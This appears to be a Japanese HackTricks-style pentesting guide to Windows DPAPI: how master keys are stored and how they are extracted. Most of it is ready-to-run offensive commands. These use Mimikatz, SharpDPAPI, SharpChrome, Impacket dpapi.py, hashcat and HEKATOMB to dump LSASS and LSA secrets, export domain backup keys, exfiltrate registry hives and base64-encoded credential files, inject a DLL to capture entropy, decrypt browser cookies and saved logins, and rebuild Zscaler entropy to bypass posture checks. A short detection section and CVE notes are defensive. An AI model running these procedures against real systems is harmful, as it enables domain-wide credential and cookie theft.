# DPAPI - パスワードの抽出

{{#include ../../banners/hacktricks-training.md}}



## DPAPIとは

Data Protection API（DPAPI）は、主に Windows オペレーティングシステム内で、ユーザーまたはシステムの秘密情報を重要なエントロピー源として利用し、**非対称秘密鍵を対称暗号化する**ために使用されます。この方式では、ユーザーのログオン秘密情報から派生したキー、またはシステム暗号化の場合はシステムのドメイン認証秘密情報を使用してデータを暗号化できるため、開発者が暗号化キー自体の保護を管理する必要がなくなり、暗号化が簡素化されます。

DPAPI の最も一般的な使用方法は **`CryptProtectData` および `CryptUnprotectData`** 関数を使用することです。これらの関数により、現在ログオンしているプロセスのセッションでデータを安全に暗号化および復号できます。つまり、暗号化されたデータは、暗号化を実行した同じユーザーまたはシステムによってのみ復号できます。

さらに、これらの関数は **`entropy` パラメーター**も受け取ります。このパラメーターは暗号化と復号の両方で使用されるため、このパラメーターを使用して暗号化されたデータを復号するには、暗号化時に使用されたものと同じ entropy の値を指定する必要があります。

### ユーザーキーの生成

DPAPI は、各ユーザーの認証情報に基づいて一意のキー（**`pre-key`** と呼ばれます）を生成します。このキーはユーザーのパスワードやその他の要素から派生し、アルゴリズムはユーザーの種類によって異なりますが、最終的には SHA1 になります。たとえば、ドメインユーザーの場合、**ユーザーの NTLM hash に依存します**。

これは特に重要です。攻撃者がユーザーのパスワード hash を取得できれば、次のことが可能になります。

- API に接続する必要なく、そのユーザーのキーを使用して **DPAPI で暗号化された任意のデータを復号する**
- 有効な DPAPI キーの生成を試行して **パスワードをオフラインで crack する**

さらに、ユーザーが DPAPI を使用してデータを暗号化するたびに、新しい **master key** が生成されます。この master key が実際にデータの暗号化に使用されるキーです。各 master key には、それを識別する **GUID**（Globally Unique Identifier）が付与されます。

master key は **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** ディレクトリに保存されます。ここで `{SID}` は、そのユーザーの Security Identifier です。master key はユーザーの **`pre-key`** によって暗号化され、さらに復旧用の **domain backup key** によっても暗号化されます（つまり、同じキーが異なる 2 つのパスによって 2 回暗号化されて保存されます）。

なお、master key の暗号化に使用される **domain key は domain controllers に保存され、変更されることがありません**。そのため、攻撃者が domain controller にアクセスできる場合、domain backup key を取得して、その domain 内のすべてのユーザーの master key を復号できます。<sup>[[2]](#references)</sup>

暗号化された blob のヘッダーには、その内部のデータの暗号化に使用された **master key の GUID** が含まれています。

> [!TIP]
> DPAPI encrypted blob は **`01 00 00 00`** で始まります。

master key を検索する:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
これはユーザーの Master Keys の一部がどのように見えるかを示したものです：

![DPAPI とは - Users key generation：これはユーザーの Master Keys の一部がどのように見えるかを示したものです](<../../images/image (1121).png>)

### Machine/System key generation

これは、マシンがデータを暗号化するために使用する key です。**DPAPI_SYSTEM LSA secret** に基づいており、SYSTEM user だけがアクセスできる特別な key です。この key は、machine-level credentials や system-wide secrets など、システム自体からアクセスする必要があるデータの暗号化に使用されます。<sup>[[2]](#references)</sup>

これらの key には **domain backup がない**ため、ローカルでのみアクセス可能です：

- **Mimikatz** は、次のコマンドで LSA secrets を dump してアクセスできます：`mimikatz lsadump::secrets`
- secret は registry 内に保存されているため、administrator は **アクセスするために DACL permissions を変更できます**。registry path は次のとおりです：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives から offline extraction を行うことも可能です。たとえば、target 上で administrator として hives を保存し、exfiltrate します：
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
その後、analysis box 上で hives から DPAPI_SYSTEM LSA secret を復元し、それを使用して machine-scope blobs（scheduled task passwords、service credentials、Wi-Fi profiles など）を復号します:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPIによって保護されるデータ

DPAPIによって保護される個人データには、次のものがあります。

- Windows creds
- Internet ExplorerおよびGoogle Chromeのパスワードと自動入力データ
- OutlookやWindows Mailなどのアプリケーションのメールおよび内部FTPアカウントのパスワード
- 共有フォルダー、リソース、wireless networks、Windows Vaultのパスワード（暗号化キーを含む）
- リモートデスクトップ接続、.NET Passport、さまざまな暗号化および認証目的で使用されるprivate keysのパスワード
- Credential Managerで管理されるネットワークパスワード、およびCryptProtectDataを使用するアプリケーション（Skype、MSN messengerなど）の個人データ
- レジストリ内の暗号化されたblobs
- ...

システムによって保護されるデータには、次のものがあります。
- Wi-Fiパスワード
- Scheduled taskのパスワード
- ...

### Master keyの抽出方法

- ユーザーがdomain admin権限を持っている場合、**domain backup key**にアクセスして、ドメイン内のすべてのユーザーのmaster keyを復号できます。
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- ローカル管理者権限があれば、**LSASS メモリにアクセス**して、接続中のすべてのユーザーの DPAPI master keys と SYSTEM key を抽出できます。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスして machine master keys を復号できます。
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのパスワードまたは NTLM hash が既知の場合、**ユーザーの master keys を直接復号**できます：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッション内にいる場合、**RPCを使用してmaster keysを復号するためのbackup key**をDCに要求できます。local adminで、かつユーザーがログイン中であれば、このために**そのユーザーのsession tokenを盗む**ことができます。
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault の一覧表示
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPIで暗号化されたデータへのアクセス

### DPAPIで暗号化されたデータを探す

一般的にユーザーの**ファイルが保護されている**場所：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記のパスで `\Roaming\` を `\Local\` に変更した場所も確認します。

Enumerationの例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) は、ファイルシステム、レジストリ、B64 blobs 内の DPAPI で暗号化された blob を検出できます:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
なお、同じ repo に含まれる [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) を使用すると、DPAPI により保護された cookies などの機密データを復号できます。<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron の quick recipes（SharpChrome）

- Current user、対話的な保存済みログイン情報/cookies の復号（ユーザーコンテキストで実行すると、ユーザーの Credential Manager から追加のキーが解決されるため、Chrome 127 以降の app-bound cookies でも動作します）：
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- ファイルしかない場合の Offline analysis。まず profile の "Local State" から AES state key を抽出し、それを使って cookie DB を復号します。
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key（PVK）と対象ホストの admin 権限がある場合の、ドメイン全体／remote triage：
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- ユーザーの DPAPI prekey/credkey（LSASS から取得）を持っている場合、password cracking をスキップして profile data を直接復号できます：
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
注記
- 新しい Chrome/Edge ビルドでは、特定の cookies が "App-Bound" encryption を使用して保存される場合があります。追加の app-bound key がなければ、これらの特定の cookies を Offline decryption することはできません。対象ユーザーのコンテキストで SharpChrome を実行すると、自動的に取得できます。以下で参照している Chrome security blog post を参照してください。<sup>[[5]](#references)</sup>

### Access keys and data

- **SharpDPAPI を使用して**、current session の DPAPI encrypted files から credentials を取得します：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **認証情報の情報を取得**（暗号化されたデータや guidMasterKey など）。<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeysへのアクセス**:

RPCを使用して、**domain backup key**を要求するユーザーのmasterkeyを復号します:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** toolは、masterkeyの復号用に以下の引数もサポートしています（`/rpc`を使用してdomains backup keyを取得したり、`/password`を使用して平文のパスワードを指定したり、`/pvk`を使用してDPAPI domain private keyファイルを指定したりできる点に注目してください...）：<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkeyを使用してデータを復号**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** ツールは、`credentials|vaults|rdg|keepass|triage|blob|ps` の復号に対して、次の引数もサポートしています（`/rpc` を使用してドメインの backup key を取得したり、`/password` を使用してプレーンテキストのパスワードを指定したり、`/pvk` を使用して DPAPI ドメイン秘密鍵ファイルを指定したり、`/unprotect` を使用して現在のユーザーのセッションを利用したりできる点に注目してください...）：<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkeyを直接使用する（パスワード不要）

LSASSをdumpできる場合、Mimikatzは多くの場合、平文のパスワードを知らなくてもユーザーのmasterkeysを復号できる、logonごとのDPAPI keyを公開します。この値をtoolingに直接渡します：
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **現在のユーザーセッション**を使用して一部のデータを復号化する:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py を使用した Offline 復号

被害ユーザーの SID とパスワード（または NT hash）があれば、Impacket の dpapi.py を使用して、DPAPI masterkeys と Credential Manager blobs を完全に Offline で復号できます。<sup>[[10]](#references)[[11]](#references)</sup>

- ディスク上の artefacts を特定します。
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- 対応する masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- file transfer tooling が不安定な場合は、対象ファイルを on-host で base64 に変換し、出力をコピーします。
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- ユーザーの SID と password/hash を使って masterkey を復号する：
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 復号された masterkey を使用して credential blob を復号する：
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
このワークフローでは、Windows Credential Manager を使用して保存されたドメイン認証情報を回収できることが多く、管理者アカウント（例: `*_adm`）も含まれます。

---

### Optional Entropy（"Third-party entropy"）の扱い

一部のアプリケーションは、`CryptProtectData` に追加の **entropy** 値を渡します。この値がなければ、正しい masterkey が判明していても blob を復号できません。そのため、この方法で保護された認証情報（Microsoft Outlook や一部の VPN クライアントなど）を対象とする場合、entropy の取得が不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）は、対象プロセス内の DPAPI functions に hook を仕掛け、渡された optional entropy を透過的に記録する user-mode DLL です。`outlook.exe` や `vpnclient.exe` などのプロセスに対して EntropyCapture を **DLL-injection** mode で実行すると、各 entropy buffer を呼び出し元のプロセスおよび blob に対応付けたファイルが出力されます。取得した entropy は、後から **SharpDPAPI**（`/entropy:`）または **Mimikatz**（`/entropy:<file>`）に渡してデータを復号できます。<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### masterkey の offline cracking（Hashcat & DPAPISnoop）

Microsoft は、Windows 10 v1607（2016）以降、**context 3** masterkey format を導入しました。`hashcat` v6.2.6（2023 年 12 月）では、hash-modes **22100**（DPAPI masterkey v1 context ）、**22101**（context 1）、**22102**（context 3）が追加され、masterkey file から user password を直接 GPU-accelerated cracking できるようになりました。そのため、Attackers は target system とやり取りすることなく、word-list または brute-force attacks を実行できます。<sup>[[7]](#references)</sup>

`DPAPISnoop`（2024）は、この process を自動化します：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
この tool は Credential および Vault blobs も parse でき、cracked keys で decrypt して cleartext passwords を export できます。<sup>[[8]](#references)</sup>


### 他のマシンのデータへのアクセス

**SharpDPAPI と SharpChrome** では、**`/server:HOST`** option を指定して、remote machine のデータにアクセスできます。もちろん、その machine にアクセスできる必要があり、以下の例では **domain backup encryption key が既知である** と仮定しています。
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAP directory からすべてのユーザーとコンピューターを自動的に抽出し、RPC 経由で domain controller backup key を抽出するツールです。その後、script はすべてのコンピューターの IP address を解決し、すべてのコンピューターに対して smbclient を実行して、すべてのユーザーの DPAPI blobs を取得し、domain backup key を使ってすべてを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP から抽出したコンピューター一覧を使えば、把握していなかった場合でも、すべてのサブネットワークを見つけられます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は、DPAPI によって保護された secrets を自動的に dump できます。2.x release では、以下が導入されました。<sup>[[9]](#references)</sup>

* 数百台の host から blobs を並列収集
* **context 3** masterkeys の parsing と Hashcat cracking の自動統合
* Chrome の「App-Bound」encrypted cookies のサポート（次のセクションを参照）
* endpoint を繰り返し poll し、新しく作成された blobs との差分を取得する新しい **`--snapshot`** mode

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は、masterkey/credential/vault files 用の C# parser であり、Hashcat/JtR formats を出力でき、必要に応じて cracking を自動的に実行できます。Windows 11 24H1 までの machine および user masterkey formats を完全にサポートしています。<sup>[[8]](#references)</sup>


## 一般的な検知

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他の DPAPI-related directories 内の files への access。
- 特に **C$** や **ADMIN$** などの network share 経由の access。
- **Mimikatz**、**SharpDPAPI** または類似の tooling を使用して LSASS memory に access したり、masterkeys を dump したりする行為。
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** object への access と関連付けて検知できます。
- process が *SeTrustedCredManAccessPrivilege* (Credential Manager) を要求した際の Event **4673/4674**

---
### 2023-2025 の vulnerabilities と ecosystem の変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。network access を持つ attacker は、domain member を誘導して malicious DPAPI backup key を取得させ、user masterkeys を復号できました。2023 年 11 月の cumulative update で patch 済みです – administrators は DCs と workstations が完全に patch 済みであることを確認してください。<sup>[[4]](#references)</sup>
* **Chrome 127 の「App-Bound」cookie encryption**（2024 年 7 月）では、従来の DPAPI-only protection が置き換えられ、user の **Credential Manager** に保存される追加の key が導入されました。cookies の offline decryption には、DPAPI masterkey と **GCM-wrapped app-bound key** の両方が必要になりました。SharpChrome v2.3 と DonPAPI 2.x は、user context で実行した場合に追加の key を recovery できます。<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID から導出される Custom Entropy

Zscaler Client Connector は、`C:\ProgramData\Zscaler` 配下に複数の configuration files（例: `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）を保存します。各 file は **DPAPI (Machine scope)** で encryption されていますが、vendor は disk 上に保存する代わりに、*runtime で計算される* **custom entropy** を提供します。<sup>[[1]](#references)</sup>

entropy は次の 2 つの要素から再構築されます。

1. `ZSACredentialProvider.dll` 内に埋め込まれた hard-coded secret。
2. configuration が属する Windows account の **SID**。

DLL に実装された algorithm は、次と同等です。
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
秘密情報はディスクから読み取れる DLL に埋め込まれているため、**SYSTEM 権限を持つローカル攻撃者は、任意の SID の entropy を再生成し、blob をオフラインで復号できます**。
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
復号すると、すべての **device posture check** とその期待値を含む完全な JSON 設定が得られます。これは、client-side bypasses を試みる際に非常に価値の高い情報です。

> TIP: その他の暗号化された artefacts（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）は、entropy なし（`16` 個のゼロバイト）で DPAPI によって保護されています。そのため、SYSTEM privileges を取得すれば、`ProtectedData.Unprotect` で直接復号できます。

## References

- [1] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Security analysis and data recovery in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Reading DPAPI Encrypted Secrets with Mimikatz and C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Simple Extraction of DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
